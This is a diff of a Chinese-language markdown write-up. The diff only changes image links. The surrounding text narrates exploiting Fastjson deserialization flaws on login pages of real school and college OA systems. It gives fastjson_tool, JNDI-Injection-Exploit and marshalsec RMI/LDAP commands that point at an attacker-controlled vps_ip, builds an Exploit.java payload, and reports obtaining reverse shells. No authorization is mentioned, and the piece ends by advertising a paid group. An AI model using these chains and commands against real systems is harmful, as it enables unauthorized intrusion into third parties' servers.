@@ -31,24 +31,24 @@ Hvv五件套: Log4j，Shiro，SpringBoot，Fastjson，弱口令
 
 某学校官网看到一个高职扩招报名入口，点击进去,输入账号密码
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001814.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001814.png)
 
 后无意看到burp插件扫出改登录口存在fastjson漏洞。
 
 一般当我们看到利用链是用小于或登录1.2.47的利用链的时候这个漏洞就是稳稳存在的，如果是HTTP请求利用链的话，只能说明改网站用的是fastjson框架，但不一定是fastjson反序列化漏洞
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001816.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001816.png)
 
 使用fastjson_tool去构造fastjson1.2.24-1.2.47左右的利用链 java -jar fastjson_tool.jar
 fastjson.HLDAPServeer vps_ip 8080 "command" 然后可随意使用某条利用链后使用利用链请求，成功反弹shell
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001817.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001823.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001817.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001823.png)
 
 ## 0x03 案例二: 某学院OA系统fastjson
 
 某学校OA后台登录框中测试，登录入口存在fastjson<=1.2.47的反序列化漏洞
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001826.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001828.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001826.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001828.png)
 
 通过利用链可看出该fastjson版本在1.2.47左右,这里我们直接使用
 
@@ -57,28 +57,28 @@ fastjson.HLDAPServeer vps_ip 8080 "command" 然后可随意使用某条利用链
     java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C '[command]ping dnslog.cn' -A vps_ip  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001831.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001831.png)
 
 这里选择的利用链要和我们服务器对应得java版本一样,这里选择jdk1.8版本得进行测试ldap和rmi，并无任意返回
 
 后面就进入了沉思阶段，想着使用飞鸿得JNID回显利用链进行反弹，然后得然后，github突然打不开了，后发现jdk1.8和jdk1.7之间还有个spring1.2.x
 和tomcat 8版本左右得利用链，想着死马当活马医算了，结果还真rce了（当然飞鸿师傅的JNDI注入回显利用工具也是可以的）
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001834.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001834.png)
 
 使用该工具去反弹shell得时候我们需要去java.lang网站去进行base64编码
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001837.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001838.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001837.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001838.png)
 
 成功反弹shell
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001841.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001843.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001841.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001843.png)
 
 ## 0x04 案例三
 
 同样也是在某次后台登陆时，发现请求包时json格式，然后立马去看看工具里面有无fastjson成功记录，结果是有的，这种http请求利用链一般都是1.2.24反序化得利用链。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001845.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001845.png)
 
 但是看到http请求利用链心就凉了一大截，如果是HTTP请求利用链的话，之能说明改网站用的是fastjson框架，但不一定存在fastjson反序列化漏洞，这里一开始是使用了fastjson_tools和JNDI-
 Injection-Exploit-1.0-SNAPSHOT-all.jar都无请求成功结果。后面使用最古老的方式，先构造Exploit.java文件。
@@ -130,11 +130,11 @@ Injection-Exploit-1.0-SNAPSHOT-all.jar都无请求成功结果。后面使用最
     }  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001848.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001848.png)
 
 然后使用javac Exploit.java为一个class文件，同时在同目录下开一个http服务（因为懒所以就没有截图了）
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001851.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001851.png)
 
 看网上都是使用RMI格式进行rce，这里我们也是首先尝试RMI
 
@@ -143,21 +143,21 @@ Injection-Exploit-1.0-SNAPSHOT-all.jar都无请求成功结果。后面使用最
     java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “http://vps_ip/8000/#Exploit" 9999  
     
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001854.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001854.png)
 
 RMI服务这边有回显，但是http服务那边无请求
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001856.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001859.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001856.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001859.png)
 
 使用LDAP进行请求rce，ldap服务这边有请求回显、http服务有请求回显，命令执行成功。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001902.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001902.png)
 
 构造bash反弹，成功getshell (工具githu上全有，自己所搜就行)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001905.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001908.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001905.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001908.png)
 
-**从现在开始，星球定价150元！日后只有慢慢涨没有跌价！现在入股不亏，持续输出原创文章，还是小有干货的！**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001911.png)  
+**从现在开始，星球定价150元！日后只有慢慢涨没有跌价！现在入股不亏，持续输出原创文章，还是小有干货的！**![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220220001911.png)  
 
 预览时标签不可点
 
